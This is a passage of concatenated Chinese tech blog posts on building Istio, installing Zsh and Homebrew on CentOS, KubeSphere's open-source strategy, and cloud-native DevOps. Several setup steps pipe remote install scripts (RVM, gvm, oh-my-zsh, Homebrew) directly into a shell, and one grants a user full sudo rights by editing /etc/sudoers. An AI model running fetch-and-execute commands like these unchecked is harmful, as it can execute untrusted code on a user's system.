Agent 使用。Kubelet 管理 Pod ，而 Agent 管理 IaaS。两者之间有共同点可以思考。 另外，Kubernetes 单集群支持高达 5000 个节点，能满足绝大部分需求场景。通过多集群可以支持更多节点。 可以支持更多来源的二进制分发。示例中使用的是 https 文件，也可以使用本地文件，还可以将 S3 中的文件下载到本地再打包。同时，最终的镜像只比原始文件大几 M。 脚本执行可以继续优化。当 Job 执行完成时，脚本执行也会结束。在实践过程中，应该向主机添加托管的服务。这里为了演示简便，没有深究。 直接使用 hostIPC/hostPID 的 Pod 替代传统虚拟机上的服务进程也是一种方案。 7. 参考 如何在主机上调试容器、在容器中操作主机 ","description":"","id":230,"section":"post","tags":["博文","Kubernetes","Docker","PaaS"],"title":"在 Kubernetes 中面向虚拟机节点分发文件、执行脚本","uri":"https://www.chenshaowen.com/blog/how-to-distribute-files-and-scripts-to-vm-under-kubernetes.html"},{"content":" 本文主要描述在 CentOS 8.2 下，如何使用本地工具编译 https://github.com/istio/istio 项目。另外一种方法是通过 BUILD_WITH_CONTAINER 参数控制，使用容器编译，仅依赖于 make 和 docker。\n1. 安装并升级 Ruby \u0026gt;= 2.6 安装 Ruby 1 yum install -y ruby 查看 Ruby 版本 1 2 3 ruby -v ruby 2.5.5p157 (2019-03-15 revision 67260) [x86_64-linux] 安装 RVM 1 2 3 4 yum install -y tar gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB curl -sSL https://get.rvm.io | bash -s stable source /etc/profile.d/rvm.sh 安装 Ruby 2.6 1 rvm install 2.6 查看 Ruby 版本 1 2 3 ruby -v ruby 2.6.6p146 (2020-03-31 revision 67876) [x86_64-linux] 2. 安装 FPM FPM 是一个打包工具, 能将源码打包成 rpm、deb、pkg 等格式的包。istio 目前使用的就是 FPM 。\n安装依赖 1 yum install -y ruby-devel gcc make rpm-build rubygems 安装 FPM 1 gem install --no-document fpm 3. 安装并升级 Go \u0026gt;= 1.16 安装 Go 1 yum install -y go 查看 Go 版本 1 2 3 go version go version go1.14.12 linux/amd64 低版本 Go 编译会报错 1 2 3 4 5 6 make docker ... manifests/manifest.go:18:2: package embed is not in GOROOT (/usr/lib/golang/src/embed) operator/pkg/helm/renderer.go:19:2: package io/fs is not in GOROOT (/usr/lib/golang/src/io/fs) make: *** [build-linux] Error 1 可查看 go.mod 文件检查 istio 对 Go 版本的要求。\n安装 gvm 1 2 yum install -y git bash \u0026lt; \u0026lt;(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer) 重新打开 Terminal 或者执行一下提示命令将 gvm 添加到 PATH 中。\n查看可选的 Go 版本 1 2 3 4 gvm listall ... go1.16.3 安装 Go 1 gvm install go1.16.3 设置版本 1 gvm use go1.16.3 --default 查看版本 1 2 3 go version go version go1.16.3 linux/amd64 4. 安装 Docker 添加 Docker 源 1 dnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo 安装 Docker 1 dnf install docker-ce --nobest -y 启动 Docker 1 2 systemctl enable docker systemctl start docker 5. 编译 istio 安装依赖 1 yum install -y make vim 克隆代码 这里指定一个固定的版本，方便复现，也可以直接使用 master 分支。\n1 2 git clone https://github.com/istio/istio.git -b release-1.10 cd istio 修改 Makefile 文件屏蔽 BUILD_WITH_CONTAINER=1 等参数 vim Makefile # -include Makefile.overrides.mk 如果不想修改 Makefile 文件，也可以在每条 make 命令前加上 BUILD_WITH_CONTAINER=0 不使用容器进行构建。\n否则，默认会使用容器环境进行构建。\n[可选]定制参数 这一步主要用于设置镜像的格式，默认是 docker.io/istio/xxx:tag-or-sha1。\n1 2 3 export USER=\u0026#34;shaowenchen\u0026#34; export HUB=\u0026#34;docker.io/$USER\u0026#34; export TAG=\u0026#34;dev\u0026#34; 编译全部镜像 1 make docker 查看镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 docker images|grep shaowenchen Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg. docker.io/shaowenchen/install-cni dev 8a9c31c0c4a7 10 seconds ago 286 MB docker.io/shaowenchen/operator dev b71597601723 27 seconds ago 240 MB docker.io/shaowenchen/istioctl dev 5d65d14fd7e4 37 seconds ago 242 MB docker.io/shaowenchen/app_sidecar_centos_7 dev 26f3a9648acc 47 seconds ago 559 MB docker.io/shaowenchen/app_sidecar_centos_8 dev 2b0c1152137a About a minute ago 548 MB docker.io/shaowenchen/app_sidecar_debian_10 dev fef52d04e703 2 minutes ago 353 MB docker.io/shaowenchen/app_sidecar_debian_9 dev 389d00724d36 3 minutes ago 337 MB docker.io/shaowenchen/app_sidecar_ubuntu_focal dev 572f901273f1 3 minutes ago 314 MB docker.io/shaowenchen/app_sidecar_ubuntu_bionic dev f8cce2842939 4 minutes ago 317 MB docker.io/shaowenchen/app_sidecar_ubuntu_xenial dev 7e5622aacfa1 4 minutes ago 371 MB docker.io/shaowenchen/app dev 69c061680f8e 5 minutes ago 189 MB docker.io/shaowenchen/proxyv2 dev a09e64c4e01f 5 minutes ago 305 MB docker.io/shaowenchen/pilot dev 047f2d849519 5 minutes ago 241 MB 编译某个组件及其镜像 在 tools/istio-docker.mk 中定义了各个组件镜像的编译过程。\n1 2 3 4 DOCKER_TARGETS ?= docker.pilot docker.proxyv2 docker.app docker.app_sidecar_ubuntu_xenial \\ docker.app_sidecar_ubuntu_bionic docker.app_sidecar_ubuntu_focal docker.app_sidecar_debian_9 \\ docker.app_sidecar_debian_10 docker.app_sidecar_centos_8 docker.app_sidecar_centos_7 \\ docker.istioctl docker.operator docker.install-cni 下面以 istioctl 为例:\n1 make istioctl 1 make docker.istioctl 查看编译结果 1 2 3 4 ls out/linux_amd64 bug-report docker_build envoy-centos istio-cni istio-cni-taint istio-iptables logs pilot-agent release client envoy install-cni istio-cni-repair istioctl istio_is_init operator pilot-discovery server 1 2 3 4 docker images|grep istioctl Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg. docker.io/shaowenchen/istioctl dev f55daa65098d 7 seconds ago 242 MB 推送镜像到 DockerHub 推送之前需要登陆 DockerHub。\n1 make push.docker.istioctl 6. 总结 建议使用 CentOS 8 进行编译，因为 CentOS 7.6 下编译 app_sidecar_centos 镜像时会卡主，下面是截取的日志。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Step 1/14 : ARG VM_IMAGE_NAME=ubuntu Step 2/14 : ARG VM_IMAGE_VERSION=bionic Step 3/14 : ARG BASE_VERSION=latest Step 4/14 : FROM gcr.io/istio-release/app_sidecar_base_${VM_IMAGE_NAME}_${VM_IMAGE_VERSION}:${BASE_VERSION} ---\u0026gt; 697dbc6cd975 Step 5/14 : COPY certs/ /var/lib/istio/ ---\u0026gt; Using cache ---\u0026gt; 725e4acd0342 Step 6/14 : COPY certs/default/* /var/run/secrets/istio/ ---\u0026gt; Using cache ---\u0026gt; a1f2cd8f8596 Step 7/14 : COPY istio-sidecar.deb /tmp/istio-sidecar.deb ---\u0026gt; a1a01e6e9993 Step 8/14 : RUN dpkg -i /tmp/istio-sidecar.deb \u0026amp;\u0026amp; rm /tmp/istio-sidecar.deb ---\u0026gt; Running in 28c5abc9a6a0 经过上面一系列操作之后 Docker 也假死，具体原因有待排查。\nCentOS 8 使用 Podman 替代了 Docker CLI ，GLIBC 也不用升级，很容易编译成功。\n7. 参考 https://fpm.readthedocs.io/en/latest/installing.html https://github.com/istio/istio/wiki/Preparing-for-Development ","description":"","id":231,"section":"post","tags":["博文","CentOS","Istio"],"title":"如何在 CentOS 8 下编译 istio 项目","uri":"https://www.chenshaowen.com/blog/how-to-build-istio-under-centos.html"},{"content":"1. 以开源为核心的商业模式 开源的魅力之一在于其包容性。它能接受怀揣各种意图的人，无论是执着技术的的工程师，还是心怀鬼胎的商人，亦或是热心公益的志愿者，甚至茶余饭后的看客，都能在这里碰撞、交融，形成一股力量。\n围绕开源做商业，应该被允许和接受。开源和商业是互相成就的关系。最新的开源报告显示，在 GitHub 上，开发者工作日比周末明显活跃。这说明全职的开源开发者正在增加，开源正在给开发者带来收入。这些收入可能来自某个基金会、某家商业公司、某些赞助商，支持着开发者全身心地投入开源。\n基于开源的商业模式需要思考几个问题。\n开源能给产品带来什么？开源不仅仅是将源码托管在 GitHub，而是需要管理和运营社区，借助社区的力量积攒人气、扩大影响力。\n为什么用户要使用这个产品？开源并不意味着降低了对产品的要求，产品的领先性是开源成功的关键因素之一。打磨一个好的产品并不是一件容易的事。需要对领域有深入理解，对用户习惯有所把握，才能通过产品填补沟壑，实现价值的传导。\n能为这个产品提供怎样的服务？开源是免费的，但服务是收费的。如果没有持续的收入，商业是难以稳定投入开源的。这种收入通常不直接来源于开源，而是以开源为基础进行衍生。开源软件可以免费使用，但如果需使用培训、增强安全、适配场景、修复问题、咨询方案、定制开发、分发应用等，就有商业机会。\n2. KubeSphere 的开源之路 自 2018 年 04 月正式立项, KubeSphere 同年 07 月 发布 1.0, 2019 年 04 月 发布 2.0, 2020 年 08 月 发布 3.0。\n连续三年，每年千万级别的研发投入，青云对 KubeSphere 期待很大，称之为青云 2.0，面向云原生的新生代。提供 HC、增加人力是上层对下层最直接的支持方式。最近几年，KubeSphere 团队来来往往的人很多，但总体人数一直是保持增长的。值得一说的是，KubeSphere 开始渗透到青云的其他团队，周边的团队在以 KubeSphere 为模板加速融入云原生。\n而 KubeSphere 交出的答卷是:\n主仓库 kubesphere/kubesphere 超 5.1K star 安装工具 ks-installer 下载量达 1M+ 中文论坛/Slack/微信群均达到了 1~2 K 人 从数据上看，KubeSphere 完成了原始积累，拿到了云原生的门票。下面从几个不同的方面对其进行讨论。\n2.1 产品研发 产品研发的策略是，先堆积功能吸引用户，再拆分做可插拔的架构。\n纯 ToB 的公司，最难的是找到愿意尝鲜的用户。如果没有用户持续地使用、反馈，是开发不出好产品的。因此，从一开始 KubeSphere 就在追赶功能，不断地集成组件，用来吸引更多用户。1.0 管理原生 Kubernetes 基础对象、DevOps、Prometheus 监控、应用商店；2.0 Istio、日志；3.0 多集群、网络管理。\n但是，仅集成组件积攒人气是不够的。不能带来收入，向上面对老板的压力大，向下回报少离职率高。幸运的是青云属于 IaaS 厂商，有很多的组件可以对接到云原生生态，比如存储、负载均衡器、云主机等。通过提供全独立的 Kubernetes + KubeSphere 服务，不仅带动了青云 IaaS 及周边产品的销售，还给 KubeSphere 打入用户心智带来了可能。\n与此同时，研发有机会接触用户真实的使用场景，反哺产品的设计。\n在未来的 4.0 架构中，预期是以 KubeSphere 为核心架构，以应用商店作为分发渠道，构建一个类似 IOS 的生态。与之配套的还有一个服务销售系统 kubesphere.cloud，提供工单、定制化开发等服务。\n至此，就是一个很常见的架构模式了。我之前参与过的一个项目也是这个想法。我也写过一些关于平台的思考，可以参考《领域输出才是 PaaS 的核心竞争力》 。\n下面是引用的一张图:\nKubeSphere 的平台目标对应到 PaaS 层。但在 KubeSphere 设计之初，更像是以 SaaS 的定位进行开发的，并没有提供公共的运行时，也没有抽象公共的 SDK 库。这其实对应着 aPaaS 和 iPaaS 两部分。\n首先，需要下沉基础的功能，比如统一的错误码、日志输出方式、鉴权控制、前端脚手架等，这其实就是一套开发框架。KubeSphere 以微服务的形式提供核心的用户、权限、应用商店等功能。\n然后，基于开发框架，对 DevOps、微服务、日志、网络管理等组件进行重构，上线到应用商店。但这不会是一个短暂的过程，主要有两方面的原因。\n架构解耦有难度 如果你看过 KubeSphere 源码就会发现，这些组件都是通过功能开关控制，而且相互之间具有依赖关系。KubeSphere 在架构演进、协作模式上在学习 Kubernetes ，忽略了其面向应用的定位，对开发者并不友好。\n风格惯性很强 下面是 KubeSphere 1.0 的 UI:\n和 3.0 很像。风格一旦形成，是很难改变的，这就是产品的基因。SaaS 拆分为 PaaS/SaaS 也会面临很大挑战。\n代码拆分可能只是其中很小一部分，Monorepo 改成 Polyrepo 不会很耗时，风险在于用户习惯、文档、FAQ 、博客等前期的积累都会失效，之前参与者的经验都需要更新。参考 SkyWalking 的发展路线，其也经历了数次重构，从原型验证、产品化，到社区化、丰富功能，最后是性能优化。但能被津津乐道，也正说明其稀有，KubeSphere 任重而道远。\n2.2 发展阶段 这里我想引用一下鸿沟理论，如下图:\nCNCF 孵化项目的三个阶段对应着鸿沟理论中的三个群体:\nSandbox, 沙箱, 创新者 Incubating, 孵化, 早期采纳者 Graduated, 毕业，早期大众 KubeSphere 已经完成了从 0 到 1, 证明了其市场存在的空间，同时培养了一批粉丝。我认为，KubeSphere 目前进入了早期采纳者的视野，正在向上爬升。\n在不同的阶段，需要有不同的侧重点。长期应该有战略，遇事有方向；短期应该有战术，实践有方法。这样积小胜才有大胜。\n在项目的初期，研发更加重要，早期打好根基，用心开发产品，证明其价值。\n目前 KubeSphere 在功能上基本已经补齐，处于走量推广的阶段，重视运营、拉新、留存、增量市场。主要的目标是规模化地铺开，积极响应反馈，维护好用户群体。\n在后期大规模应用时，会暴露很多的问题。用户对产品更加挑剔，需要再次回归到研发，将上一个阶段的反馈改进到产品中，产品也因此从早期采纳者步入早期大众的视野。\n2.3 服务方式 一共有三种服务方式，公有云、私有云、纯服务。\n借助青云的公有云 IaaS，KubeSphere 提供全独立的 Kubernetes 服务 QingCloud KubeSphere Engine（简称 QKE）。用户只需要在青云的控制台选择 QKE ，即可获取基于青云 IaaS、云硬盘、负载均衡器的 Kubernetes 集群。同时，还提供免费的集群工单服务。除此，业界另外两种服务方式，半托管和全托管的 Kubernetes 集群服务，技术上更具挑战，目前并不适合 KubeSphere 。\n在私有云市场上，结合青云公、私有云一致的技术架构，KubeSphere 能提供自 IaaS 到容器的全套解决方案。私有云中标后的分成，是 KubeSphere 的主要收入来源。\n纯服务是更大的梦想，这也是我觉得有意思的地方。从 OpenPitrix 到 kubesphere.cloud, 青云似乎总能找到好主意。OpenPitrix 意在统一运行时，实现应用的全生命周期管理，无论是部署在阿里云、亚马逊云、VMware，还是 Kubernetes。而 kubesphere.cloud 将服务从厂商剥离开，单独进行销售，同时允许开源社区的其他参与者作为卖家参与。\n目前的服务方式依靠的是工单值班人员、售前、售后、研发，以人工为主，往往客户会击穿中间环节，直达研发。这并不是一种 Scalable 方式，服务卖得越多，团队越难协作，我认为这是急需解决的问题之一。\n3. 一些关于组织和经营策略的思考 3.1 创新至关重要 创业不是将别人的蛋糕抢到自己的碗里，而是要将蛋糕做大。\n创业时，不要选择存量市场，而应该选择增量市场。\u0026ldquo;Cloud Native is eating the world\u0026rdquo;, Kubernetes 就是一个增量的市场。云原生会接管运维基础设施、研发流程，存在巨大的市场机会和发展空间。\nKubeSphere 选择了一个好的赛道。Kubernetes、云原生、Istio 能吸引用户和资本的眼球。KubeSphere 选择了一个大家嫌不够技术含量的 Dashboard 作为切入点，避开了竞争，又抓住了用户的痛点，还提供了很大的想象空间。\n不要走别人走过的路，否则你永远只能跟随。\n3.2 注重内部知识流动 创业公司的人才梯度落差很大，内部知识的流动非常重要。\n创业公司的回报可能和大公司很不一样，创业公司会将成本集中到极少数人身上。虽然保证了极少数人不流失，但是高离职率会带来很多潜在的问题，也明显降低了团队整体的效率。\n钱可以解决一部分问题，但快速成长的机会、开心的工作环境、行业的发展前景也是可以留住人心的。\n注重内部知识的流动可以避免人员单点、提升人员能力、减少人员离职。创业公司通常没有实力组建自己的学院，更多需要内部形成一种机制和氛围。\n内部不仅仅指的是同一个团队，其实也包括售前、售后等其他合作者，这就需要发挥制度创新，将利益相关者聚合起来。\n3.3 靠机制而不是靠人 人的服务是不利于规模化的，人的决策蕴含较大风险，人的流失也意味着业务的风险。我们要将经验、思考都转换为可见的东西。\n处理业务问题时，要学会记录，形成解决方案，进而行文至文档，编写为脚本等自动化工具，输出为产品，转化为自助服务。\n我们需要的是一套能替代人的工作流。任何人都可以启动，执行，得到一致的结果。\n另一方面，培养员工也需要形成一套制度，让实习生也可以成为主力，就不会担心人员流失了。\n3.4 意愿大于技巧 方向是错的，不要紧，只要有人愿意不断地纠正，起步反而是最难的。\n考虑得很全并不是一件很好的事，事倍而功半。这种考虑局限于现有的经验和当前的环境，一旦经验增长、环境发生变化，以前的结论就会被推翻。\nkubekey 是一个很好的例子，运维愿意学 Go 搞研发，那么就随他干。现在 kubekey 也是 KubeSphere 核心产品矩阵之一了。\n有意愿做，那么就小步快跑地做，不要犹豫。很多时候，退一步就会节节败退; 反过来抗住了就会打开一片新的天空。\n3.5 分区办公要根据职责划分 分区办公指的是一个团队在物理上被隔离在不同的地方。一个团队被分割在不同城市，北京、上海、武汉、成都，甚至有的在家里，看似很 nice，非常 global，但如果架构得不好，人员流失率会很高。\n一个团队构成一个系统架构。一个团队分成很多个小组，一个组有一个具体的目标，一个小组共同为这个目标而努力。\n一个组应该被分配到一个区域，比如微服务在武汉，多集群在成都，DevOps 在北京。而不能一个组三个人分布到三个地区，这样会造成极高的沟通成本。即使现在远程办公在家被逐步接受，但这种没有建立感情的小组人员极易流失，而且不会替项目考虑太多，说走就走。\n根据职责划分区域是比较合适的一种方式。一个分区的成员可以充分的沟通，不同分区之间相互协作，构成一个完整的团队。\n4. 参考 https://www.chenshaowen.com/blog/make-decisions-through-data.html https://log.qingcloud.com/archives/4855 ","description":"","id":232,"section":"post","tags":["博文","开源","ToB","思考","KubeSphere","Kubernetes"],"title":"ToB 创业公司的开源之路 - KubeSphere","uri":"https://www.chenshaowen.com/blog/the-road-to-open-source-for-tob.html"},{"content":"1. 安装 zsh 1 sudo yum install -y zsh 2. 安装 oh-my-zsh 1 sh -c \u0026#34;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; 建议将 Zsh 设置为默认的 Shell。\n3. 安装插件 3.1 安装 autojump 1 sudo yum install -y epel-release 1 sudo yum install -y autojump-zsh 3.2 安装 zsh-autosuggestions 1 git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions 3.3 安装 zsh-syntax-highlighting 1 git clone git://github.com/zsh-users/zsh-syntax-highlighting $ZSH_CUSTOM/plugins/zsh-syntax-highlighting 4. 添加 .zshrc 配置 1 sed -i \u0026#39;s/^plugins=(\\(.*\\)/plugins=(autojump zsh-autosuggestions zsh-syntax-highlighting \\1/\u0026#39; ~/.zshrc 退出 Terminal, 再次登录即可。\n","description":"","id":233,"section":"post","tags":["博文","CentOS","环境","Zsh"],"title":"CentOS 7 下安装并配置 Zsh","uri":"https://www.chenshaowen.com/blog/install-zsh-in-centos-7.html"},{"content":" 在 CentOS 下安装包时，通常需要寻找各种源，使用 Homebrew 就没这样的烦恼。本文使用的是 CentOS 7.6，不同的系统版本可能会有差异。\n1. 创建非 root 用户 Homebrew 不允许以 root 身份运行，因此需要创建一个新的用户。\n新建用户 1 adduser shaowenchen 设置密码 1 passwd shaowenchen 给新用户添加 sudo 权限 编辑权限配置文件:\n1 2 chmod +w /etc/sudoers vi /etc/sudoers 添加如下内容\n1 shaowenchen ALL=(ALL:ALL) ALL 恢复文件权限\n1 chmod -w /etc/sudoers 2. 安装并配置 Homebrew 2.1 安装必要的基础软件 本文安装的是 Homebrew 3.0.9 , 官方文档中描述存在如下依赖:\n* GCC 4.7.0 or newer\r* Linux 2.6.32 or newer\r* Glibc 2.13 or newer\r* 64-bit x86_64 CPU\r可以跳过 GCC 的检查，之后使用 Homebrew 进行安装。\n检查内核版本 1 2 3 uname -a Linux myhost 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 检查 Glibc 版本 1 2 3 4 5 6 7 ldd --version ldd (GNU libc) 2.17 Copyright (C) 2012 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. 安装基础软件 1 2 yum groupinstall -y ‘Development Tools’ yum install -y curl file git 2.2 升级 git 和 curl 升级 git 版本，不低于 2.7.0 1 yum install -y https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm 升级版本\n1 yum update -y git 查看版本\n1 2 3 git --version git version 2.30.1 升级 curl 版本，不低于 7.41.0 1 yum install -y http://www.city-fan.org/ftp/contrib/yum-repo/city-fan.org-release-2-1.rhel7.noarch.rpm 编辑源文件，开启 [city-fan.org]，将 enabled 置为 1。\n1 2 3 4 5 vi /etc/yum.repos.d/city-fan.org.repo [city-fan.org] ... enabled=1 安装依赖\n1 yum install -y https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/l/libnghttp2-1.33.0-1.1.el7.x86_64.rpm 升级版本\n1 yum update -y curl 查看版本\n1 2 3 curl --version curl 7.75.0 3. 安装 Homebrew 切换到非 root 用户 1 su shaowenchen 安装 Homebrew 1 /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; 添加 brew 命令到 PATH 1 2 3 4 test -d ~/.linuxbrew \u0026amp;\u0026amp; eval $(~/.linuxbrew/bin/brew shellenv) test -d /home/linuxbrew/.linuxbrew \u0026amp;\u0026amp; eval $(/home/linuxbrew/.linuxbrew/bin/brew shellenv) test -r ~/.bash_profile \u0026amp;\u0026amp; echo \u0026#34;eval \\$($(brew --prefix)/bin/brew shellenv)\u0026#34; \u0026gt;\u0026gt;~/.bash_profile echo \u0026#34;eval \\$($(brew --prefix)/bin/brew shellenv)\u0026#34; \u0026gt;\u0026gt;~/.profile 直接将 .linuxbrew/bin 添加到 PATH 会导致安装新工具时，make 报错。\n查看版本 1 2 3 4 brew --version Homebrew 3.0.9 Homebrew/homebrew-core (git revision 1ce004f2f0b; last commit 2021-03-28) [可选]添加 brew 到 Zsh test -r ~/.zshrc \u0026amp;\u0026amp; echo \u0026#34;eval \\$($(brew --prefix)/bin/brew shellenv)\u0026#34; \u0026gt;\u0026gt;~/.zshrc 4. 使用 之前写过一篇 《Homebrew 使用》 ，介绍了一些常用的命令，这里不再重复。仅安装几个常用的软件，用于测试。\n安装 GCC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 brew install gcc ==\u0026gt; Downloading https://linuxbrew.bintray.com/bottles/isl-0.23.x86_64_linux.bottle.tar.gz ==\u0026gt; Downloading from https://akamai.bintray.com/46/46537a01a0cc82ea18528293b6bac03be7ab14b2fc3a7a28051f1b26e24f6c57?__gda__=exp=1616978202~hmac=b7727c9ae79b54bebc199a095c01e70251446ed4012bfb5900dd877e06229fd1\u0026amp;response-content-disposition=attachment%3Bfilename%3D%22isl-0 ######################################################################## 100.0% ==\u0026gt; Downloading https://linuxbrew.bintray.com/bottles/gcc-10.2.0_4.x86_64_linux.bottle.tar.gz ==\u0026gt; Downloading from https://akamai.bintray.com/e6/e62efea399fd03d854ff871210b941e5c3277d821e9148badceeda883f53f016?__gda__=exp=1616978204~hmac=a7e19e02629bc1c462635349fe3c01039f581e2014153c704f72e54bc2d93c35\u0026amp;response-content-disposition=attachment%3Bfilename%3D%22gcc-1 ################# 24.9% ######################################################################## 100.0% ==\u0026gt; Installing dependencies for gcc: isl ==\u0026gt; Installing gcc dependency: isl ==\u0026gt; Pouring isl-0.23.x86_64_linux.bottle.tar.gz 🍺 /home/linuxbrew/.linuxbrew/Cellar/isl/0.23: 73 files, 6.6MB ==\u0026gt; Installing gcc ==\u0026gt; Pouring gcc-10.2.0_4.x86_64_linux.bottle.tar.gz Warning: The post-install step did not complete successfully You can try again using: brew postinstall gcc ==\u0026gt; Summary 🍺 /home/linuxbrew/.linuxbrew/Cellar/gcc/10.2.0_4: 1,481 files, 264.3MB ==\u0026gt; No outdated dependents to upgrade! ==\u0026gt; Checking for dependents of upgraded formulae... ==\u0026gt; Reinstalling 1 broken dependent from source: gcc 安装 Kubectl 1 2 3 4 5 6 7 8 9 10 11 brew install kubectl ==\u0026gt; Downloading https://linuxbrew.bintray.com/bottles/kubernetes-cli-1.20.4_1.x86_64_linux.bottle.tar.gz ==\u0026gt; Downloading from https://akamai.bintray.com/c5/c5dd394d0bd150aff18ded31f29e52ece6dcbd064ebe46e7f746891822a12eff?__gda__=exp=1616978407~hmac=13c24ddb7a7e90118b1aa8184d2c4688f719a945c4f0d033352a7cae9c845887\u0026amp;response-content-disposition=attachment%3Bfilename%3D%22kuber ######################################################################## 100.0% ==\u0026gt; Pouring kubernetes-cli-1.20.4_1.x86_64_linux.bottle.tar.gz ==\u0026gt; Caveats Bash completion has been installed to: /home/linuxbrew/.linuxbrew/etc/bash_completion.d ==\u0026gt; Summary 🍺 /home/linuxbrew/.linuxbrew/Cellar/kubernetes-cli/1.20.4_1: 246 files, 40.9MB 安装 Kind 1 2 3 4 5 6 7 8 9 10 11 brew install kind ==\u0026gt; Downloading https://linuxbrew.bintray.com/bottles/kind-0.10.0.x86_64_linux.bottle.tar.gz ==\u0026gt; Downloading from https://akamai.bintray.com/7a/7a5595da7f271219a53cbd95a5b729c581fb3e4f8ece6d449074cbe33f10d627?__gda__=exp=1616978455~hmac=754a3789f01e3c27ebdfa1b65e51392eaeacf61f878a9d607b78d342f52c5dfa\u0026amp;response-content-disposition=attachment%3Bfilename%3D%22kind- ######################################################################## 100.0% ==\u0026gt; Pouring kind-0.10.0.x86_64_linux.bottle.tar.gz ==\u0026gt; Caveats Bash completion has been installed to: /home/linuxbrew/.linuxbrew/etc/bash_completion.d ==\u0026gt; Summary 🍺 /home/linuxbrew/.linuxbrew/Cellar/kind/0.10.0: 8 files, 9.4MB 5. 参考 https://docs.brew.sh/Homebrew-on-Linux#requirements ","description":"","id":234,"section":"post","tags":["博文","CentOS","环境","Homebrew"],"title":"CentOS 7 下安装并配置 Homebrew","uri":"https://www.chenshaowen.com/blog/install-homebrew-in-centos-7.html"},{"content":"1. 什么是云原生 云原生是一个快速发展的领域。\n2013 年, Pivotal 提出云原生的概念，并不断对其进行解读。下面是 Pivotal 对云原生架构的特征描述:\n2015年，12-Factor、面向微服务、抗脆弱 2017年，可观测性、模块化、可替代性、可处理性 2019年，DevOps、持续交付、微服务、容器 很多人接触云原生，可能是从 CNCF 开始的。CNCF 项目、全景图是云原生绕不开的焦点，下面是 CNCF 对云原生的特征描述:\n2015年，容器化、微服务、编排调度 2018年，不可变基础设施、声明式 API、服务网格 这些定义基本上，能给出云原生的骨架。下面是我对云原生的一些认识:\n随着互联网的高速发展，业务规模、数量、复杂度急剧增长，各种研发相关的框架一波又一波，但运维领域并没有发生大的变化，继续写 shell、Ansible，能用 Django 写页面就已经很不错了。\n转折点来自 Docker 对容器技术的推广，之后 Kubernetes 又统一了容器编排领域。大家意识到 Kubernetes 是一个共识的操作系统，在分布式的资源之上构建了统一的控制平面，可以对标到 Linux。而云原生的描述更多是在与传统的架构划分界限。以前需要登录机器进行变更，现在是不可变的基础设施；以前是过程式的一系列动作，现在是声明式的描述；以前是单体服务，现在是微服务。这些新的特性能让业务更快迭代、更平稳健壮、更可靠访问，反过来又促进了云原生进一步地发展。\n2. 什么是 DevOps 云原生离不开 DevOps，每个人心中对 DevOps 都有着不同的定义。DevOps 是一个被泛化的概念，涵盖了从需求端到上线的全过程，接管了整个研发流程。但理解 DevOps 只需记住一句话，端到端的价值交付。\n传统的工作方式更像是大工厂，每个人只交付自己负责的环节。如上图，如果一个过程有三个步骤 A、B、C，那么就需要三个人各自负责。一旦某个环节出错，将影响整个交付。\nDevOps 提倡的是面向价值的交付，只有同时完成了 A4、B6、C4，交付给用户之后，产出才有意义。因此，DevOps 更看重的是团队的协作，完整制品的快速交付，拒绝半成品。\n从开发者提交代码、构建镜像、进行代码扫描、执行单元测试、构件制品，最终部署上线，就是一个端到端的交付过程。这种重复性很高的流程，我们通常需要借助一定的工具完成，那就是 CICD 工具。\n3. 云原生下集成 DevOps 平台 3.1 如何开发一个 CICD 工具 首先思考一个问题，如何设计一个 CICD 工具？定义一套 DSL 语义。\n我们可以将 DSL 分为两个部分，Outer DSL 和 Inner DSL。Inner DSL 就是 CICD 引擎，用于执行具体的逻辑，例如 Jenkins、GitLab CI 等。另一部分 Outer DSL 用于提供给用户描述 CICD 流程，例如 Jenkins 中的 Groovy、GitLab CI 中的 Yaml。\n底层封装复杂性，向上层提供服务。Inner DSL 实现流程的解析，提供与 CICD 紧密相关的功能，用户不需要太多关注。Outer DSL 用于表达用户的意图，易于学习和掌握，针对 CICD 场景提供表达能力。\n3.2 Operator 连接万物 在云原生背景下，我们通常采用 Operator 模式进行扩展。也就是使用 CRD 定义 Scheme 字段，将对象数据存储为 CR ，Informer watch 到变化之后通过 Controller 不断地 Reconcile ，最终达到预期的状态。\n可以从两个角度描述这一模式。\n声明式，是云原生的特征之一。如果需要将一个组件的副本数设置为 3，传统的方式是 +1、+1、+1。但在 Kubernetes 下，只需要声明副本的数量为 3 即可，系统会帮用户完成 +1、+1、+1 的过程。Operator 就是将传统的过程式转变为声明式。\n替代人工。Operator 字面意思操作者，已经很清楚地表述了其作用，用于替代人工。Operator 融入了运维领域的知识，将人的技能固化到程序代码中，通过读取 CR 数据进行指定的操作，达到与人工运维同等效果。\nOperator 可以连接一切外部的组件，替代人工运维过程， 比如部署 Redis 集群、对接 Jenkins 等。\n3.3 DevOps Operator 针对国内的调研数据显示，超过 50 % 的用户使用的是 Jenkins 作为其 CICD 引擎。因此，KubeSphere DevOps 选择的也是 Jenkins。\n在 KubeSphere DevOps 中，我们对其进行了如下抽象。\n产品概念 Kubernetes 对象 Jenkins 对象 DevOps 工程 DevopsProject 文件夹 流水线 Pipeline 流水线/多分支流水线 凭证 Credential 文件夹下的凭据 下面是处理流程示意图:\n通过前端页面，我们将 CR 对象写入 Etcd 中，然后不断地 watch 通过 Controller 将数据同步到 Jenkins 